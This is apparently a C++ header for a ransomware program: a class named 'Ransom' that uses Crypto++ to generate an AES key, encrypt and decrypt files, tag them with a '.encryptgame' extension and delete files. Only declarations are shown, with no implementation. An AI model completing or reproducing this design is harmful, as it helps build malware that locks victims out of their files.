#pragma once

#include <files.h>
#include <osrng.h>
#include <filesystem>
#include "../cryptopp/modes.h"

class Ransom
{
public:
	Ransom() = default;
	~Ransom() = default;
	void run_encryption_logic();
	void run_decryption_logic();

private:
	const char* custom_extension_name = ".encryptgame";
	CryptoPP::AutoSeededRandomPool rng_;
	CryptoPP::SecByteBlock* key_;
	CryptoPP::SecByteBlock* iv_;
	void encrypt_files(const char* file_name);
	void decrypt_files(const char* file_name);
	void generate_aes_key();
	static void delete_file(const char* file);
	
};